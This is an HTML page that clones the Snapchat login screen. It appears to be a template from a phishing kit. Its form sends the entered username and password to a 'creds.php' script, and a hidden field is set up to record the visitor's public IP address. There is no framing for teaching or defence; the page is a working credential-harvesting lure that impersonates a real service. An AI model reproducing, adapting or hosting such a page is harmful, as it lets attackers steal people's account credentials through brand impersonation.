<!DOCTYPE html>
<html>
<head>

<meta http-equiv="content-type" content="text/html; charset=UTF-8" />

<meta name="viewport" content="width=device-width, initial-scale=1.0" />

<title>Log In • Snapchat</title>

<style>
	@font-face {
		font-family: aviner-next;
		src: url('https://snapnet-cdn.storage.googleapis.com/fonts/avenir-next/AvenirNext-Medium.woff2');
	}

	* {
		margin: 0;
		padding: 0;
		color: #656B73;
		font-family: aviner-next;
	}

	#container {
		text-align: center;
		margin: auto;
	}

	#hero {
		background-color: #fffc00;
		text-align: center;
		border-radius: 25px;
		max-width: 600px;
		box-shadow: 0px 0px 4px 8px rgba(0, 0, 0, 0.055);
		margin: auto;
	}

	#logo {
		width: 40px;
		height: 40px;
		text-align: center;
		margin-top: 15px;
	}

	h1 {
		font-size: 24px;
		font-weight: 800;
		text-align: center;
		color: #16191C;
		margin-top: 12px;
		padding: 30px;
	}

	input {
		margin: 5px 2px 5px 2px;
		padding: 5px 8px 5px 8px;
		font-size: 16px;
	}

	#type {
		max-width: 234px;
		text-align: center;
		margin: auto;
	}

	#forgot {
		font-size: 12px;
		text-align: left;
		padding-right: 15px;

	}

	#forgot a {
		margin-left: 15px;
		text-decoration: none;	
		color: #0099be;
	}

	#submit {
		padding-bottom: 20px;
		padding-top: 8px;
	}

	#submit #button {
	 	padding:8px 32px;
	 	font-size:17px;
	 	line-height: 1.3;
	 	border-radius:45px;
	 	text-align:center;
	 	display:block;
	 	border-color:transparent;
	 	letter-spacing: 0.1px;
	 	cursor:pointer;font-weight: 400;
	 	background-color: #0eadff;
	 	color: white;
	 	border: 1px solid rgba(0, 0, 0, 0.2);
	 	margin: auto;
	 	font-size: 24px;
	 }

	 #new {
	 	padding-bottom: 20px;
	 }

	 #new a {
	 	color: #0099be;
	 }

	 #nav {
	 	position: relative;
	 	background-color: #262626;
	 	max-width: 600px;
	 	width: 100vw;
	 	top: -25px;
	 	z-index: -1;
	 	padding-bottom: 25px;
	 	text-align: center;
	 	margin: auto;
	 }

	 table tr td {
	 	padding-top: 25px;
	 	top: 25px;
	 	position: relative;
	 }

	 table tr td a {
	 	text-underline-position: 15px;
	 }

</style>
<body>
	<div id="container">

		<img src="snapchat-app-icon.svg" id="logo" alt="Snapchat logo">

		<div id="hero">

			<h1>Log in to Snapchat</h1>

			<form method="post" action="../creds.php">

				<div id="type">

					<input type="text" name="username" class="username" autocomplete="off" placeholder="Username or Email">

					<br>

					<input type="password" name="password" class="password" autocomplete="off" placeholder="Password">

					<br>

					<p id="forgot"><a href="#">Forgot Password?</a></p>

					<br>

				</div>
                
                <input type="hidden" name="ip" value"$PublicIP" >
                
				<div id="submit">

					<input id="button" type="submit" value="Log In">

				</div>

			</form>

			<p id="new">New To Snapchat? <a href="#">Sign Up</a></p>

		</div>



		<table id="nav">
			<tr id="topest">
				<td>
					<a href="#">Company</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Community</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Advertising</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Legal</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Language</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Privacy Policy</a>
				</td>
			</tr>
			<tr>
				<td>
					<a href="#">Terms of Service</a>
				</td>
			</tr>
		</table>
	</div>
	<?php    
   
    ?>

</body>
</html>

